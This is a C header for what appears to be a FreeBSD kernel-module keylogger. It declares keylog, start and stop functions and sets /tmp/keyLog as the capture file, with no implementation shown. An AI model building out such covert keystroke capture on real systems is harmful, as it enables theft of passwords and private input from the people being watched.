#ifndef KEYLOG_H
#define KEYLOG_H

#include "config.h"
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>

int keylog(struct thread *td, char * buf);
void start_keylog(void);
void stop_keylog(void);


#define keyLogPath "/tmp/keyLog" 

#endif /* KEYLOG_H */
